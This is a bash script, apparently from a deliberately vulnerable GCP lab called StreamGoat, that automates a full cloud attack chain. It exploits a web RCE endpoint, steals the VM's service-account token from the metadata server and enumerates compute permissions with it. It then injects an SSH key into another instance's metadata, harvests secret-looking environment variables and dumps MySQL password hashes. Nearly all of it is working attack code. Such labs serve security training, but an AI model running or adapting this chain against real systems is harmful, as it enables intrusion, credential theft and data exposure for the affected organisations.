#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \/ _ \/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===            StreamGoat - Scenario 1              ===" "${RESET}"
  printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
  printf "  • Step 1. Exploitation of Web RCE, metadata stealing on VMa\n"
  printf "  • Step 2. Permission enumeration for stolen metadata\n"
  printf "  • Step 3. Access gathering to VMb via uploading new sshkey\n"
  printf "  • Step 4. Stealing credentials to access RDS\n"
  printf "  • Step 5. Accessing sensitive data in RDS\n"
}
banner

#############################################
# Preflight checks (no changes to your logic)
#############################################
step "Preflight checks"
missing=0
for c in gcloud curl jq; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true

#############################################
# Step 1. Exploitation of Web RCE, metadata stealing
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Exploitation of Web RCE, metadata stealing  ===" "${RESET}"
is_valid_ipv4() {
  local ip="$1" o1 o2 o3 o4
  [[ $ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || return 1
  IFS='.' read -r o1 o2 o3 o4 <<<"$ip"
  for o in "$o1" "$o2" "$o3" "$o4"; do
    [[ $o =~ ^[0-9]+$ ]] && (( o >= 0 && o <= 255 )) || return 1
  done
  return 0
}

# ---- Prompt + IP format validation loop (keeps asking until valid) ----
step "Target selection"
while :; do
  read -r -p "Enter IP of vulnerable application: " TARGET_IP
  if is_valid_ipv4 "$TARGET_IP"; then
    ok "IP format looks valid: $TARGET_IP"
    break
  else
    err "Invalid IPv4 address. Expected dotted quad (e.g., 203.0.113.10). Try again."
  fi
done

TARGET_URL="http://$TARGET_IP/cmd"
info "Target endpoint: $TARGET_URL"

# ---- Connectivity check: require HTTP 200 on /cmd?c=id ----
step "Probing $TARGET_URL for RCE reachability (expects HTTP 200)"
spin_start "Sending test request (c=id)"
set +e
HTTP_CODE="$(curl -sS -m 8 --connect-timeout 4 -o /dev/null -w "%{http_code}" \
                  -G --data-urlencode c=id "$TARGET_URL")"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ]; then
  err "curl failed (exit $CURL_RC). Check SG/NACL/route/DNS."
  exit 1
fi
if [ "$HTTP_CODE" != "200" ]; then
  err "Endpoint responded with HTTP $HTTP_CODE (expected 200). Aborting."
  exit 1
fi
ok "RCE endpoint reachable (HTTP 200) — proceeding."

step "Verification of exploitation: $TARGET_URL?c=id"
ok "$(curl -sG $TARGET_URL?c=id)"

spin_start "Fetching instance credentials from metadata via remote /cmd"
read -r -d '' PAYLOAD <<'BASH' || true
/usr/bin/env bash -lc '
set -euo pipefail
# request short-lived access token from metadata server (service account attached to the VM)
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
'
BASH

# send the payload to /cmd using --data-urlencode to preserve quoting
set +e
TOKEN_JSON="$(curl -sS -m 12 --connect-timeout 6 -G --data-urlencode "c@-" "$TARGET_URL" <<<"$PAYLOAD")"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ] || [ -z "$TOKEN_JSON" ]; then
  err "Failed to obtain token JSON from the remote host (curl rc=$CURL_RC)."
  exit 5
fi

# tidy output
echo "$TOKEN_JSON" | jq . >/dev/null 2>&1 || {
  err "Received non-JSON or invalid JSON from remote. Raw output:"
  printf '%s\n' "$TOKEN_JSON"
  exit 6
}


# Extract the access token and expiry
ACCESS_TOKEN="$(echo "$TOKEN_JSON" | jq -r '.access_token')"
EXPIRES_IN="$(echo "$TOKEN_JSON" | jq -r '.expires_in')"
if [ -z "$ACCESS_TOKEN" ] || [ "$ACCESS_TOKEN" = "null" ]; then
  err "Failed to parse access_token from the token JSON. Raw:"
  echo "$TOKEN_JSON"
  exit 7
fi

PROJECT_ID="$(curl -sG --data-urlencode "c@-" "$TARGET_URL" <<'CMD'
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/project-id"
CMD
)"
PROJECT_ID="$(echo "$PROJECT_ID" | tr -d '\r\n')"
[ -n "$PROJECT_ID" ] || { echo "[ERR] failed to retrieve project id"; exit 5; }

# 3) Create/activate gcloud configuration and store ephemeral token helper
CFG="streamgoat-scenario-1"

if gcloud config configurations describe "$CFG" >/dev/null 2>&1; then
  gcloud config configurations activate "$CFG" >/dev/null 2>&1
else
  gcloud config configurations create "$CFG" >/dev/null 2>&1
  gcloud config configurations activate "$CFG" >/dev/null 2>&1
fi
gcloud config set project "$PROJECT_ID" --configuration="$CFG" >/dev/null 2>&1

# write helper env file that exports the token for using gcloud as the VM SA
mkdir -p "/tmp/.streamgoat"
ENVFILE="/tmp/.streamgoat/${CFG}.env"
printf "export CLOUDSDK_AUTH_ACCESS_TOKEN='%s'\n" "$ACCESS_TOKEN" > "$ENVFILE"
printf "export GOOGLE_ACCESS_TOKEN='%s'\n" "$ACCESS_TOKEN" >> "$ENVFILE"
printf "export CLOUDSDK_ACTIVE_CONFIG_NAME='%s'\n" "$CFG" >> "$ENVFILE"
printf "export STREAMGOAT_PROJECT='%s'\n" "$PROJECT_ID" >> "$ENVFILE"
chmod 600 "$ENVFILE"

printf "\n"
ok "Identified project_id = ${YELLOW}${PROJECT_ID}${RESET}. Configuration ${YELLOW}${CFG}${RESET} is set and stored in ${YELLOW}${ENVFILE}${RESET}"

read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 2: Permission enumeration for stolen metadata
################################################################################

printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for stolen metadata  ===\n" "${RESET}"

try() {
  local desc="$1"; shift
  local rc
  set +e
  "$@" >/dev/null 2>&1
  rc=$?
  set -e
  if [ $rc -eq 0 ]; then
    printf "[%s] %s[OK]%s    %s\n" "$(date +%H:%M:%S)" "$GREEN" "$RESET" "$desc"
  else
    printf "[%s] %s[DENY]%s  %s\n" "$(date +%H:%M:%S)" "$RED" "$RESET" "$desc"
  fi
}

printf "GCP tokens work a bit different comparing with AWS but similar to Azure. We may check the area of possible token usage (scope) via requesting tokeninfo.\n"
source $ENVFILE
curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=${GOOGLE_ACCESS_TOKEN}"   | jq
printf "\nOur scope is ${YELLOW}'compute'${RESET} only. So lets enumerate permisions for this part.\n\n"

# 1) Compute: list instances (aggregated)
try "Compute: list instances" gcloud compute instances list
gcloud compute instances list --filter="name~^streamgoat"
try "Compute: get instances info" gcloud compute instances describe streamgoat-vm-a

printf "\nDuring recon and initial priv enumiration new compute resource was detected - ${YELLOW}streamgoat-vm-b${RESET}\n"
read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 3. Upload SSH key via setMetadata
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Access via compute.instances.setMetadata  ===" "${RESET}"

printf "\nOn step 2 we identified a few 'list' privilegies for compute service. Now we will try to check if we may modify MetaData to get access to the hosts.\n"

KEY_DIR="/tmp/.streamgoat"
KEY_FILE="${KEY_DIR}/temp_ssh_key"
PUB_FILE="${KEY_FILE}.pub"

step "Generating temporary SSH key in $KEY_DIR"
ssh-keygen -t ed25519 -N '' -f "$KEY_FILE" -q
ok "SSH key generated: $PUB_FILE"

step "Uploading SSH key to instance metadata"
# Construct SSH metadata value: <user>:<key>
OS_USER="streamgoat_attacker"
SSH_METADATA="${OS_USER}:$(cat "$PUB_FILE")"


printf "${MAGENTA}[>] Attempting to update MetaData and upload SSH key${RESET}\n"
spin_start ""
gcloud compute instances add-metadata streamgoat-vm-b --metadata="ssh-keys=${SSH_METADATA}"
SSH_UPLOAD=$?
spin_stop

if [ "$SSH_UPLOAD" -eq 0 ]; then
  ok  "MetaData successfully updated!"
else
  err "MetaData wasn't updated"
fi

# Optionally: show login command to user
PUBLIC_IP=$(gcloud compute instances describe streamgoat-vm-b --format='get(networkInterfaces[0].accessConfigs[0].natIP)' --quiet --zone="us-central1-a")

step "Verifying SSH access to ${YELLOW}$PUBLIC_IP${RESET} as user ${YELLOW}$OS_USER${RESET}"
spin_start "Attempting SSH connection and running id, hostname"

set +e
SSH_OUTPUT=$(ssh -i "$KEY_FILE" -o StrictHostKeyChecking=no -o ConnectTimeout=8 "${OS_USER}@${PUBLIC_IP}" 'echo -n "id: " && id && echo -n "hostname: " && hostname' 2>&1)
SSH_RC=$?
set -e
spin_stop


if [ "$SSH_RC" -eq 0 ]; then
  ok "SSH access verified — output below:"
  printf "\n%s\n" "$SSH_OUTPUT"
else
  err "SSH failed (exit code: $SSH_RC)"
  echo "$SSH_OUTPUT"
  exit 8
fi

read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 4. Stealing credentials via env vars and accessing sensitive data in Cloud SQL
#############################################

printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Stealing credentials via env vars and accessing sensitive data in Cloud SQL ===" "${RESET}"
step "Looking for environment variables on streamgoat-vm-b"
ssh -i "$KEY_FILE" -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$OS_USER@$PUBLIC_IP" 'bash -lc "printenv | grep -E \"DB_|SECRET_|PASS|TOKEN|CRED|KEY\""' || {
  err "SSH failed or no sensitive env vars found"
  exit 1
}
ok "Sensitive environment variables extracted"

step "Executing${YELLOW} SELECT User,plugin,authentication_string from user;${RESET}"
ssh -i "$KEY_FILE" "$OS_USER@$PUBLIC_IP" "bash -lc 'MYSQL_PWD=\$DB_PASS mysql -h \"\$DB_HOST\" -P \"\$DB_PORT\" -u \"\$DB_USER\" -D mysql -t -e \"SELECT User,plugin,authentication_string from user;\"'"
printf "\n"

rm -rf /tmp/.streamgoat
read -r -p "Scenario successfully completed. Press Enter or Ctrl+C to exit" _ || true
# ==============
# Cleanup
# ==============
